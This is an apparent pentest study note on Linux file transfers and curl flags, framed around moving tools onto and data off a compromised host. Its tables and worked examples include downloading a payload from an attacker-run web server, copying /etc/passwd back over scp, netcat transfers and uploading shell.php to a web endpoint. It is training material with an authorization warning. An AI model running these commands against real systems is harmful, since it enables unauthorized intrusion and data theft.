---
title: "LNX.6 Networking, Transfers & Curl"
aliases: ["File Transfers", "scp", "wget", "curl", "curl flags", "Downloading Files"]
tags:
  - tree/linux
  - cyber/foundations/linux
  - type/technique
  - level/operator
Domain:
  - "[[Branch Shell Power]]"
Color: "#F58231"
---

# 🌐 LNX.6 · Networking, Transfers & Curl

> [!abstract] Master Note of [[Branch Shell Power]]
> Once you have a foothold, the next problems are always **moving data** — pulling tools onto the box, exfiltrating loot off it — and **talking to services** by hand. This note covers the transfer toolkit and then a deep dive on `curl`, the operator's Swiss-army knife for HTTP.

## Getting files onto a box
| Method | Command | Notes |
| --- | --- | --- |
| **wget** | `wget http://10.10.10.5/linpeas.sh` | Simple HTTP(S) download to disk; `-O out` renames |
| **curl** | `curl -O http://10.10.10.5/tool` | `-O` keeps the remote name; `-o` renames |
| **scp** | `scp tool.sh user@target:/tmp/` | Secure copy **over SSH** — encrypted; `scp user@t:/etc/passwd .` pulls back |
| **git clone** | `git clone https://github.com/x/tool` | Pull a whole tool repo + history |
| **package mgr** | `sudo apt install nmap` · `pacman -S` · `dnf install` | The *right* way to install; offline boxes won't have it |
| **nc** | `nc -lvnp 9001 > f` ⟷ `nc host 9001 < f` | Netcat file transfer when nothing else is present |
| **base64** | `base64 -w0 f` → paste → `base64 -d > f` | Move a file through a text-only shell |

**Serve files from your attack host** (the other half of every transfer):
```shell-session
$ python3 -m http.server 80          # instant web server in the current dir
# on the target:
$ wget http://<you>/payload  ||  curl -O http://<you>/payload
```

## `curl` — the deep dive
`curl` speaks HTTP(S) (and FTP, and more) from the command line — how you test APIs, replay requests, grab pages, and script attacks. The flags to own:

| Flag | Meaning |
| --- | --- |
| `-X POST` | Set the HTTP **method** (GET/POST/PUT/DELETE) |
| `-H "Header: val"` | Add a **header** (auth tokens, `Content-Type`, custom) |
| `-d 'a=1&b=2'` | Send a **body** (implies POST); `--data-binary @file` sends raw |
| `-G` | Send `-d` data as a **query string** (GET) |
| `-F 'file=@x.php'` | **Multipart** form upload |
| `-b "sess=abc"` / `-c jar` | Send cookies / **save** cookies to a jar |
| `-u user:pass` | HTTP **basic auth** |
| `-A "Mozilla/5.0"` | Set the **User-Agent** |
| `-e http://ref` | Set the **Referer** |
| `-x http://127.0.0.1:8080` | Route through a **proxy** (e.g. Burp) |
| `-L` | **Follow** redirects |
| `-k` | **Ignore** TLS cert errors (self-signed labs) |
| `-o file` / `-O` | Save to a named file / keep the remote filename |
| `-s` / `-S` | **Silent** / show errors while silent (scripting) |
| `-I` | Fetch **headers only** (HEAD) — fast fingerprinting |
| `-v` | **Verbose** — see the full request/response exchange |
| `-w '%{http_code}'` | Print chosen response fields (great for scripting) |

### Worked examples
```shell-session
# Fingerprint a server from its headers
$ curl -sI http://target | grep -i server
Server: Apache/2.4.41 (Ubuntu)

# Log in, save the session cookie, reuse it
$ curl -s -c jar -d 'user=admin&pass=admin' http://target/login
$ curl -s -b jar http://target/dashboard

# Hit a JSON API with a bearer token
$ curl -s -X POST http://target/api/users \
       -H 'Authorization: Bearer eyJ...' \
       -H 'Content-Type: application/json' \
       -d '{"role":"admin"}'

# Route everything through Burp, ignore TLS warnings
$ curl -k -x http://127.0.0.1:8080 https://target/api/me

# Upload a file (test an upload endpoint)
$ curl -F 'file=@shell.php' http://target/upload

# Fuzz IDs and print only the HTTP status of each
$ for i in $(seq 1 20); do
    echo -n "$i: "; curl -s -o /dev/null -w '%{http_code}\n' http://target/user/$i
  done
```

### Reading a verbose exchange
`-v` shows exactly what goes on the wire — the fastest way to *understand* HTTP:
```shell-session
$ curl -v http://target/ 2>&1 | head
> GET / HTTP/1.1          # > = what curl SENT (request)
> Host: target
> User-Agent: curl/8.5.0
< HTTP/1.1 200 OK         # < = what came BACK (response)
< Server: nginx
```

> [!warning] Authorized Simulation context
> `curl` is dual-use: the same request that tests *your* API is the one used to probe **SSRF**, replay stolen tokens, or fetch a webshell. Use it against systems you own or are authorized to assess. Defensively, `-v` is unbeatable for seeing precisely what a request looks like on the wire.

> [!tip] Crook → Root
> **Crook** opens a browser. **Root** reconstructs any request in `curl`, scripts a hundred of them, pipes the output into `grep`, and pins it through a proxy for inspection — total control over the HTTP conversation.

---
> 🔼 Up: [[Branch Shell Power]]
